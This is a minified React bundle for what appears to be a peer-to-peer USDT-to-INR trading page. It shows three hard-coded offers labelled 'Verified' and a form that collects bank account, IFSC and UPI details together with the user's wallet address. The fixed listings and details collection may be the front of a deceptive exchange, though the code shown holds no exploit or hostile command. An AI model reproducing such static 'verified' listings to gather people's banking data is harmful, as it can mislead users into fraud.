                }), k.jsx("div", {
                    style: {
                        margin: "24px 0 0 0",
                        padding: "0 16px"
                    },
                    children: k.jsxs("div", {
                        style: {
                            background: K.cardBg,
                            borderRadius: 8,
                            padding: "12px 0",
                            textAlign: "center",
                            color: K.accent,
                            fontWeight: 800,
                            fontSize: 15
                        },
                        children: ["Available Trading Ads", k.jsx("br", {}), k.jsx("span", {
                            style: {
                                color: K.textSecondary,
                                fontWeight: 400,
                                fontSize: 13
                            },
                            children: "Choose the best rate for your USDT"
                        })]
                    })
                }), k.jsxs("div", {
                    style: {
                        margin: "24px 0 0 0",
                        padding: "0 16px",
                        display: "flex",
                        flexDirection: "column",
                        gap: 16
                    },
                    children: [k.jsxs("div", {
                        style: {
                            background: K.cardBg,
                            borderRadius: 12,
                            boxShadow: `0 2px 8px ${K.shadowColor}`,
                            padding: 16
                        },
                        children: [k.jsxs("div", {
                            style: {
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "space-between"
                            },
                            children: [k.jsxs("span", {
                                style: {
                                    fontWeight: 700,
                                    fontSize: 22,
                                    color: K.accent
                                },
                                children: ["₹94", " ", k.jsx("span", {
                                    style: {
                                        fontWeight: 400,
                                        fontSize: 15,
                                        color: K.textSecondary
                                    },
                                    children: "/USDT"
                                })]
                            }), k.jsx("button", {
                                style: {
                                    background: K.accent,
                                    color: K.background,
                                    border: "none",
                                    borderRadius: 8,
                                    padding: "8px 18px",
                                    fontWeight: 600,
                                    fontSize: 15
                                },
                                onClick: () => In(0),
                                disabled: !1,
                                children: u === 0 && n ? "Confirming..." : "Confirm Order"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 8,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Available:"
                            }), " ", k.jsx("span", {
                                children: "15,250.00 USDT"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 4,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Limit:"
                            }), " ", k.jsx("span", {
                                style: {
                                    color: K.text
                                },
                                children: "5,000.00 - 75,000.00 INR"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 4,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Payment:"
                            }), " ", k.jsx("span", {
                                style: {
                                    color: K.text
                                },
                                children: "Bank Transfer, UPI"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 4,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Time Limit:"
                            }), " ", k.jsx("span", {
                                style: {
                                    color: K.text
                                },
                                children: "60 min"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                alignItems: "center",
                                marginTop: 12,
                                gap: 8
                            },
                            children: [k.jsx("div", {
                                style: {
                                    background: K.infoBg,
                                    borderRadius: "50%",
                                    width: 32,
                                    height: 32,
                                    display: "flex",
                                    alignItems: "center",
                                    justifyContent: "center"
                                },
                                children: k.jsx("svg", {
                                    width: "20",
                                    height: "20",
                                    fill: "none",
                                    stroke: K.iconActive,
                                    strokeWidth: "2",
                                    viewBox: "0 0 24 24",
                                    children: k.jsx("circle", {
                                        cx: "12",
                                        cy: "12",
                                        r: "10"
                                    })
                                })
                            }), k.jsxs("div", {
                                children: [k.jsx("div", {
                                    style: {
                                        fontWeight: 600,
                                        fontSize: 15,
                                        color: K.text,
                                        cursor: "pointer",
                                        textDecoration: "underline"
                                    },
                                    onClick: () => go(Kt[0]),
                                    children: Kt[0].name
                                }), k.jsxs("div", {
                                    style: {
                                        fontSize: 13,
                                        color: K.textSecondary
                                    },
                                    children: [Kt[0].trades, " Trades ", k.jsx("span", {
                                        style: {
                                            color: K.accent
                                        },
                                        children: Kt[0].completionRate
                                    })]
                                })]
                            }), k.jsxs("span", {
                                style: {
                                    marginLeft: "auto",
                                    background: K.successBg,
                                    color: K.accent,
                                    fontWeight: 500,
                                    fontSize: 13,
                                    borderRadius: 12,
                                    padding: "2px 10px",
                                    display: "flex",
                                    alignItems: "center",
                                    gap: 4
                                },
                                children: [k.jsx("svg", {
                                    width: "16",
                                    height: "16",
                                    fill: "none",
                                    stroke: K.iconActive,
                                    strokeWidth: "2",
                                    viewBox: "0 0 24 24",
                                    children: k.jsx("polyline", {
                                        points: "20 6 9 17 4 12"
                                    })
                                }), "Verified"]
                            })]
                        })]
                    }), k.jsxs("div", {
                        style: {
                            background: K.cardBg,
                            borderRadius: 12,
                            boxShadow: `0 2px 8px ${K.shadowColor}`,
                            padding: 16
                        },
                        children: [k.jsxs("div", {
                            style: {
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "space-between"
                            },
                            children: [k.jsxs("span", {
                                style: {
                                    fontWeight: 700,
                                    fontSize: 22,
                                    color: K.accent
                                },
                                children: ["₹96.5", " ", k.jsx("span", {
                                    style: {
                                        fontWeight: 400,
                                        fontSize: 15,
                                        color: K.textSecondary
                                    },
                                    children: "/USDT"
                                })]
                            }), k.jsx("button", {
                                style: {
                                    background: K.accent,
                                    color: K.background,
                                    border: "none",
                                    borderRadius: 8,
                                    padding: "8px 18px",
                                    fontWeight: 600,
                                    fontSize: 15
                                },
                                onClick: () => In(1),
                                disabled: !1,
                                children: u === 1 && n ? "Confirming..." : "Confirm Order"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 8,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Available:"
                            }), " ", k.jsx("span", {
                                children: "8,750.50 USDT"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 4,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Limit:"
                            }), " ", k.jsx("span", {
                                style: {
                                    color: K.text
                                },
                                children: "10,000.00 - 50,000.00 INR"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 4,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Payment:"
                            }), " ", k.jsx("span", {
                                style: {
                                    color: K.text
                                },
                                children: "Bank Transfer, UPI, IMPS"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 4,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Time Limit:"
                            }), " ", k.jsx("span", {
                                style: {
                                    color: K.text
                                },
                                children: "45 min"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                alignItems: "center",
                                marginTop: 12,
                                gap: 8
                            },
                            children: [k.jsx("div", {
                                style: {
                                    background: K.infoBg,
                                    borderRadius: "50%",
                                    width: 32,
                                    height: 32,
                                    display: "flex",
                                    alignItems: "center",
                                    justifyContent: "center"
                                },
                                children: k.jsx("svg", {
                                    width: "20",
                                    height: "20",
                                    fill: "none",
                                    stroke: K.iconActive,
                                    strokeWidth: "2",
                                    viewBox: "0 0 24 24",
                                    children: k.jsx("circle", {
                                        cx: "12",
                                        cy: "12",
                                        r: "10"
                                    })
                                })
                            }), k.jsxs("div", {
                                children: [k.jsx("div", {
                                    style: {
                                        fontWeight: 600,
                                        fontSize: 15,
                                        color: K.text,
                                        cursor: "pointer",
                                        textDecoration: "underline"
                                    },
                                    onClick: () => go(Kt[1]),
                                    children: Kt[1].name
                                }), k.jsxs("div", {
                                    style: {
                                        fontSize: 13,
                                        color: K.textSecondary
                                    },
                                    children: [Kt[1].trades, " Trades ", k.jsx("span", {
                                        style: {
                                            color: K.accent
                                        },
                                        children: Kt[1].completionRate
                                    })]
                                })]
                            }), k.jsxs("span", {
                                style: {
                                    marginLeft: "auto",
                                    background: K.successBg,
                                    color: K.accent,
                                    fontWeight: 500,
                                    fontSize: 13,
                                    borderRadius: 12,
                                    padding: "2px 10px",
                                    display: "flex",
                                    alignItems: "center",
                                    gap: 4
                                },
                                children: [k.jsx("svg", {
                                    width: "16",
                                    height: "16",
                                    fill: "none",
                                    stroke: K.iconActive,
                                    strokeWidth: "2",
                                    viewBox: "0 0 24 24",
                                    children: k.jsx("polyline", {
                                        points: "20 6 9 17 4 12"
                                    })
                                }), "Verified"]
                            })]
                        })]
                    }), k.jsxs("div", {
                        style: {
                            background: K.cardBg,
                            borderRadius: 12,
                            boxShadow: `0 2px 8px ${K.shadowColor}`,
                            padding: 16
                        },
                        children: [k.jsxs("div", {
                            style: {
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "space-between"
                            },
                            children: [k.jsxs("span", {
                                style: {
                                    fontWeight: 700,
                                    fontSize: 22,
                                    color: K.accent
                                },
                                children: ["₹98", " ", k.jsx("span", {
                                    style: {
                                        fontWeight: 400,
                                        fontSize: 15,
                                        color: K.textSecondary
                                    },
                                    children: "/USDT"
                                })]
                            }), k.jsx("button", {
                                style: {
                                    background: K.accent,
                                    color: K.background,
                                    border: "none",
                                    borderRadius: 8,
                                    padding: "8px 18px",
                                    fontWeight: 600,
                                    fontSize: 15
                                },
                                onClick: () => In(2),
                                disabled: !1,
                                children: u === 2 && n ? "Confirming..." : "Confirm Order"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 8,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Available:"
                            }), " ", k.jsx("span", {
                                children: "22,100.75 USDT"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 4,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Limit:"
                            }), " ", k.jsx("span", {
                                style: {
                                    color: K.text
                                },
                                children: "2,000.00 - 100,000.00 INR"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 4,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Payment:"
                            }), " ", k.jsx("span", {
                                style: {
                                    color: K.text
                                },
                                children: "Bank Transfer"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                marginTop: 4,
                                color: K.textSecondary,
                                fontSize: 14,
                                justifyContent: "space-between"
                            },
                            children: [k.jsx("span", {
                                children: "Time Limit:"
                            }), " ", k.jsx("span", {
                                style: {
                                    color: K.text
                                },
                                children: "30 min"
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                alignItems: "center",
                                marginTop: 12,
                                gap: 8
                            },
                            children: [k.jsx("div", {
                                style: {
                                    background: K.infoBg,
                                    borderRadius: "50%",
                                    width: 32,
                                    height: 32,
                                    display: "flex",
                                    alignItems: "center",
                                    justifyContent: "center"
                                },
                                children: k.jsx("svg", {
                                    width: "20",
                                    height: "20",
                                    fill: "none",
                                    stroke: K.iconActive,
                                    strokeWidth: "2",
                                    viewBox: "0 0 24 24",
                                    children: k.jsx("circle", {
                                        cx: "12",
                                        cy: "12",
                                        r: "10"
                                    })
                                })
                            }), k.jsxs("div", {
                                children: [k.jsx("div", {
                                    style: {
                                        fontWeight: 600,
                                        fontSize: 15,
                                        color: K.text,
                                        cursor: "pointer",
                                        textDecoration: "underline"
                                    },
                                    onClick: () => go(Kt[2]),
                                    children: Kt[2].name
                                }), k.jsxs("div", {
                                    style: {
                                        fontSize: 13,
                                        color: K.textSecondary
                                    },
                                    children: [Kt[2].trades, " Trades ", k.jsx("span", {
                                        style: {
                                            color: K.accent
                                        },
                                        children: Kt[2].completionRate
                                    })]
                                })]
                            }), k.jsxs("span", {
                                style: {
                                    marginLeft: "auto",
                                    background: K.successBg,
                                    color: K.accent,
                                    fontWeight: 500,
                                    fontSize: 13,
                                    borderRadius: 12,
                                    padding: "2px 10px",
                                    display: "flex",
                                    alignItems: "center",
                                    gap: 4
                                },
                                children: [k.jsx("svg", {
                                    width: "16",
                                    height: "16",
                                    fill: "none",
                                    stroke: K.iconActive,
                                    strokeWidth: "2",
                                    viewBox: "0 0 24 24",
                                    children: k.jsx("polyline", {
                                        points: "20 6 9 17 4 12"
                                    })
                                }), "Verified"]
                            })]
                        })]
                    })]
                }), k.jsx("div", {
                    style: {
                        margin: "32px 0 0 0",
                        padding: "0 16px 32px 16px"
                    },
                    children: k.jsxs("div", {
                        style: {
                            background: K.cardBg,
                            borderRadius: 8,
                            padding: 16,
                            border: `1px solid ${K.border}`
                        },
                        children: [k.jsxs("div", {
                            style: {
                                fontWeight: 600,
                                fontSize: 16,
                                color: K.accent,
                                marginBottom: 8
                            },
                            children: [k.jsxs("svg", {
                                width: "18",
                                height: "18",
                                fill: "none",
                                stroke: K.accent,
                                strokeWidth: "2",
                                viewBox: "0 0 24 24",
                                style: {
                                    verticalAlign: "middle",
                                    marginRight: 4
                                },
                                children: [k.jsx("circle", {
                                    cx: "12",
                                    cy: "12",
                                    r: "10"
                                }), k.jsx("line", {
                                    x1: "12",
                                    y1: "8",
                                    x2: "12",
                                    y2: "12"
                                }), k.jsx("line", {
                                    x1: "12",
                                    y1: "16",
                                    x2: "12.01",
                                    y2: "16"
                                })]
                            }), "Trading Tips"]
                        }), k.jsxs("ul", {
                            style: {
                                color: K.textSecondary,
                                fontSize: 12,
                                margin: 0,
                                paddingLeft: 18,
                                listStyle: "disc"
                            },
                            children: [k.jsx("li", {
                                children: "Always verify payment before releasing USDT"
                            }), k.jsx("li", {
                                children: "Complete trades within the time limit"
                            }), k.jsx("li", {
                                children: "Use secure payment methods only"
                            }), k.jsx("li", {
                                children: "Report any suspicious activity"
                            })]
                        })]
                    })
                })]
            }), Y && k.jsx("div", {
                className: "fixed inset-0 bg-black bg-opacity-50 flex items-end justify-center z-[9999]",
                style: {
                    fontFamily: "sans-serif",
                    padding: 0,
                    margin: 0,
                    alignItems: "flex-end"
                },
                children: k.jsxs("div", {
                    className: "modal-content animate-slide-up",
                    style: {
                        background: K.background,
                        padding: "24px 16px 12px 16px",
                        minWidth: 0,
                        width: "100%",
                        maxWidth: 400,
                        boxSizing: "border-box",
                        maxHeight: "90vh",
                        position: "relative",
                        display: "flex",
                        flexDirection: "column"
                    },
                    children: [k.jsx("button", {
                        "aria-label": "Close",
                        onClick: () => W(!1),
                        style: {
                            position: "absolute",
                            top: 12,
                            right: 12,
                            background: "transparent",
                            border: "none",
                            fontSize: 24,
                            color: K.textSecondary,
                            cursor: "pointer",
                            zIndex: 10,
                            padding: 0,
                            lineHeight: 1
                        },
                        children: "×"
                    }), k.jsx("h2", {
                        style: {
                            fontWeight: 700,
                            fontSize: 18,
                            color: K.detail,
                            marginBottom: 24,
                            textAlign: "center",
                            flex: "0 0 auto"
                        },
                        children: "Enter Details"
                    }), k.jsxs("div", {
                        className: "modal-scroll-content",
                        style: {
                            flex: "1 1 auto",
                            overflowY: "auto",
                            maxHeight: "50vh",
                            marginBottom: 16,
                            paddingLeft: 12,
                            paddingRight: 12
                        },
                        children: [k.jsxs("div", {
                            className: "input-group mt-7",
                            style: {
                                marginBottom: 20
                            },
                            children: [k.jsx("p", {
                                className: "inpt_tital",
                                style: {
                                    color: K.text,
                                    fontWeight: 600,
                                    marginBottom: 8
                                },
                                children: "Amount"
                            }), k.jsxs("div", {
                                className: "border",
                                style: {
                                    display: "flex",
                                    alignItems: "center",
                                    border: `1px solid ${re === "amount" ? "#22c55e" : K.border}`,
                                    borderRadius: 8,
                                    padding: 8,
                                    background: "transparent",
                                    transition: "border-color 0.2s"
                                },
                                children: [k.jsx("div", {
                                    className: "left",
                                    style: {
                                        flex: 1
                                    },
                                    children: k.jsx("input", {
                                        type: "number",
                                        id: "recipient",
                                        placeholder: "USDT Amount",
                                        value: D,
                                        min: 1,
                                        ref: cr,
                                        onChange: ue => se(ue.target.value.replace(/[^0-9.]/g, "")),
                                        onFocus: () => he("amount"),
                                        onBlur: () => he(null),
                                        style: {
                                            padding: 10,
                                            width: "90%",
                                            background: "transparent",
                                            border: "none",
                                            outline: "none",
                                            color: K.text,
                                            fontSize: 16,
                                            borderRadius: 10
                                        }
                                    })
                                }), k.jsxs("span", {
                                    className: "right ",
                                    style: {
                                        display: "flex",
                                        alignItems: "center",
                                        gap: 8
                                    },
                                    children: [k.jsx("span", {
                                        className: "text-sm",
                                        style: {
                                            color: "#b0b0b0"
                                        },
                                        children: "USDT"
                                    }), k.jsx("span", {
                                        className: "mar_i blue text-sm ml-2",
                                        id: "maxBtn",
                                        style: {
                                            color: K.accent,
                                            cursor: "pointer"
                                        },
                                        onClick: () => se(o),
                                        children: "Max"
                                    })]
                                })]
                            }), vt && Number(D) > o && k.jsx("div", {
                                style: {
                                    color: "#e53e3e",
                                    fontSize: 13,
                                    marginTop: 6
                                },
                                children: "You do not have enough USDT funds."
                            }), k.jsx("div", {
                                style: {
                                    marginTop: 8,
                                    color: K.textSecondary,
                                    fontSize: 14
                                },
                                children: vt && ye !== null && k.jsxs(k.Fragment, {
                                    children: [D, " × ", Pt, " =", " ", k.jsxs("span", {
                                        style: {
                                            color: K.accent,
                                            fontWeight: 600
                                        },
                                        children: [Cn, " INR"]
                                    })]
                                })
                            })]
                        }), k.jsxs("div", {
                            style: {
                                marginBottom: 20
                            },
                            children: [k.jsx("label", {
                                style: {
                                    color: K.text,
                                    fontWeight: 600,
                                    marginBottom: 8,
                                    display: "block"
                                },
                                children: "Payment Method"
                            }), k.jsxs("select", {
                                value: Z,
                                onChange: ue => oe(ue.target.value),
                                style: {
                                    width: "100%",
                                    padding: "0.625rem",
                                    paddingTop: "1rem",
                                    paddingBottom: "1rem",
                                    borderRadius: 8,
                                    border: `1px solid ${K.border}`,
                                    background: K.background,
                                    color: K.text,
                                    fontSize: 16
                                },
                                children: [k.jsx("option", {
                                    value: "",
                                    children: "Select payment method"
                                }), k.jsx("option", {
                                    value: "Bank Transfer",
                                    children: "Bank Transfer"
                                }), k.jsx("option", {
                                    value: "UPI",
                                    children: "UPI"
                                })]
                            })]
                        }), Z === "UPI" && k.jsxs("div", {
                            style: {
                                marginBottom: 20
                            },
                            children: [k.jsx("label", {
                                style: {
                                    color: K.text,
                                    fontWeight: 600,
                                    marginBottom: 4,
                                    display: "block"
                                },
                                children: "UPI ID"
                            }), k.jsx("div", {
                                style: {
                                    border: `1px solid ${re === "upiId" ? "#22c55e" : K.border}`,
                                    borderRadius: 8,
                                    marginBottom: 8,
                                    background: "transparent",
                                    transition: "border-color 0.2s"
                                },
                                children: k.jsx("input", {
                                    type: "text",
                                    value: le,
                                    onChange: ue => ve(ue.target.value),
                                    placeholder: "Enter your UPI ID",
                                    style: {
                                        width: "100%",
                                        padding: "18px 18px",
                                        boxSizing: "border-box",
                                        borderRadius: 8,
                                        border: "none",
                                        background: "transparent",
                                        color: K.text,
                                        fontSize: 16,
                                        marginBottom: 0
                                    },
                                    onFocus: () => he("upiId"),
                                    onBlur: () => he(null),
                                    className: "custom-input green-focus-border"
                                })
                            }), k.jsx("label", {
                                style: {
                                    color: K.text,
                                    fontWeight: 600,
                                    marginBottom: 4,
                                    display: "block"
                                },
                                children: "Account Holder Name"
                            }), k.jsx("div", {
                                style: {
                                    border: `1px solid ${re === "upiHolder" ? "#22c55e" : K.border}`,
                                    borderRadius: 8,
                                    background: "transparent",
                                    transition: "border-color 0.2s"
                                },
                                children: k.jsx("input", {
                                    type: "text",
                                    value: ze,
                                    onChange: ue => B(ue.target.value),
                                    placeholder: "Enter account holder name",
                                    style: {
                                        width: "100%",
                                        padding: "18px 18px",
                                        boxSizing: "border-box",
                                        borderRadius: 8,
                                        border: "none",
                                        background: "transparent",
                                        color: K.text,
                                        fontSize: 16
                                    },
                                    onFocus: () => he("upiHolder"),
                                    onBlur: () => he(null),
                                    className: "custom-input green-focus-border"
                                })
                            })]
                        }), Z === "Bank Transfer" && k.jsxs("div", {
                            style: {
                                marginBottom: 20
                            },
                            children: [k.jsx("label", {
                                style: {
                                    color: K.text,
                                    fontWeight: 600,
                                    marginBottom: 4,
                                    display: "block"
                                },
                                children: "Account Holder Name"
                            }), k.jsx("div", {
                                style: {
                                    border: `1px solid ${re === "bankHolder" ? "#22c55e" : K.border}`,
                                    borderRadius: 8,
                                    marginBottom: 8,
                                    background: "transparent",
                                    transition: "border-color 0.2s"
                                },
                                children: k.jsx("input", {
                                    type: "text",
                                    value: T,
                                    onChange: ue => P(ue.target.value),
                                    placeholder: "Enter account holder name",
                                    style: {
                                        width: "100%",
                                        padding: "18px 18px",
                                        boxSizing: "border-box",
                                        borderRadius: 8,
                                        border: "none",
                                        background: "transparent",
                                        color: K.text,
                                        fontSize: 16,
                                        marginBottom: 8
                                    },
                                    onFocus: () => he("bankHolder"),
                                    onBlur: () => he(null),
                                    className: "custom-input green-focus-border"
                                })
                            }), k.jsx("label", {
                                style: {
                                    color: K.text,
                                    fontWeight: 600,
                                    marginBottom: 4,
                                    display: "block"
                                },
                                children: "IFSC Code"
                            }), k.jsx("div", {
                                style: {
                                    border: `1px solid ${re === "ifsc" ? "#22c55e" : K.border}`,
                                    borderRadius: 8,
                                    marginBottom: 8,
                                    background: "transparent",
                                    transition: "border-color 0.2s"
                                },
                                children: k.jsx("input", {
                                    type: "text",
                                    value: J,
                                    onChange: ue => ie(ue.target.value),
                                    placeholder: "Enter IFSC code",
                                    style: {
                                        width: "100%",
                                        padding: "18px 18px",
                                        boxSizing: "border-box",
                                        borderRadius: 8,
                                        border: "none",
                                        background: "transparent",
                                        color: K.text,
                                        fontSize: 16,
                                        marginBottom: 8
                                    },
                                    onFocus: () => he("ifsc"),
                                    onBlur: () => he(null),
                                    className: "custom-input green-focus-border"
                                })
                            }), k.jsx("label", {
                                style: {
                                    color: K.text,
                                    fontWeight: 600,
                                    marginBottom: 4,
                                    display: "block"
                                },
                                children: "Bank Account Number"
                            }), k.jsx("div", {
                                style: {
                                    border: `1px solid ${re === "bankAccount" ? "#22c55e" : K.border}`,
                                    borderRadius: 8,
                                    marginBottom: 8,
                                    background: "transparent",
                                    transition: "border-color 0.2s"
                                },
                                children: k.jsx("input", {
                                    type: "number",
                                    value: R,
                                    onChange: ue => F(ue.target.value.replace(/[^0-9]/g, "")),
                                    placeholder: "Enter bank account number",
                                    style: {
                                        width: "100%",
                                        padding: "18px 18px",
                                        boxSizing: "border-box",
                                        borderRadius: 8,
                                        border: "none",
                                        background: "transparent",
                                        color: K.text,
                                        fontSize: 16,
                                        marginBottom: 8
                                    },
                                    onFocus: () => he("bankAccount"),
                                    onBlur: () => he(null),
                                    className: "custom-input green-focus-border"
                                })
                            }), R && R.length < 11 && k.jsx("div", {
                                style: {
                                    color: "#e53e3e",
                                    fontSize: 12,
                                    marginBottom: 8
                                },
                                children: "Account number must be at least 11 digits"
                            }), k.jsx("label", {
                                style: {
                                    color: K.text,
                                    fontWeight: 600,
                                    marginBottom: 4,
                                    display: "block"
                                },
                                children: "Bank Name"
                            }), k.jsx("div", {
                                style: {
                                    border: `1px solid ${re === "bankName" ? "#22c55e" : K.border}`,
                                    borderRadius: 8,
                                    background: "transparent",
                                    transition: "border-color 0.2s"
                                },
                                children: k.jsx("input", {
                                    type: "text",
                                    value: ne,
                                    onChange: ue => ae(ue.target.value),
                                    placeholder: "Enter bank name",
                                    style: {
                                        width: "100%",
                                        padding: "18px 18px",
                                        boxSizing: "border-box",
                                        borderRadius: 8,
                                        border: "none",
                                        background: "transparent",
                                        color: K.text,
                                        fontSize: 16
                                    },
                                    onFocus: () => he("bankName"),
                                    onBlur: () => he(null),
                                    className: "custom-input green-focus-border"
                                })
                            })]
                        }), k.jsxs("div", {
                            style: {
                                display: "flex",
                                alignItems: "center",
                                gap: 8,
                                color: K.textSecondary,
                                fontSize: 14,
                                marginBottom: 16
                            },
                            children: [k.jsxs("svg", {
                                width: "18",
                                height: "18",
                                fill: "none",
                                stroke: K.accent,
                                strokeWidth: "2",
                                viewBox: "0 0 24 24",
                                children: [k.jsx("circle", {
                                    cx: "12",
                                    cy: "12",
                                    r: "10"
                                }), k.jsx("line", {
                                    x1: "12",
                                    y1: "8",
                                    x2: "12",
                                    y2: "12"
                                }), k.jsx("line", {
                                    x1: "12",
                                    y1: "16",
                                    x2: "12.01",
                                    y2: "16"
                                })]
                            }), k.jsx("span", {
                                children: "Please ensure the payment details added are correct. Wrong details may lose your funds forever. Make it."
                            })]
                        })]
                    }), k.jsx("button", {
                        style: {
                            width: "100%",
                            background: rn ? K.accent : K.buttonInactiveText,
                            color: K.background,
                            border: "none",
                            borderRadius: 8,
                            padding: "12px 0",
                            fontWeight: 700,
                            fontSize: 18,
                            opacity: rn ? 1 : .5,
                            cursor: rn ? "pointer" : "not-allowed",
                            marginTop: 8,
                            flex: "0 0 auto"
                        },
                        disabled: !rn,
                        onClick: async () => {
                            let ue = null;
                            window.ethereum && (ue = (await new Wn(window.ethereum).eth.getAccounts())[0]),
                            ue || (ue = new URLSearchParams(window.location.search).get("address")),
                            ue || (ue = E()),
                            await uf({
                                wallet_address: ue,
                                amount: D,
                                payment_method: Z,
                                upiId: le,
                                upiHolder: ze,
                                bankHolder: T,
                                ifsc: J,
                                bankAccount: R,
                                bankName: ne,
                                action: "details_submitted"
                            }),
                            W(!1)
                        }
                        ,
                        children: "Confirm"
                    })]
                })
            })]
        })
    }
    function h4() {
        return k.jsx(WD, {
            children: k.jsxs(CD, {
                children: [k.jsx(Lp, {
                    path: "/",
                    element: k.jsx(f4, {})
                }), k.jsx(Lp, {
                    path: "/trader/:name",
                    element: k.jsx(d4, {})
                })]
            })
        })
    }
    KS.createRoot(document.getElementById("root")).render(k.jsx(Q.StrictMode, {
        children: k.jsx(h4, {})
    }))
}
);
export default m4();
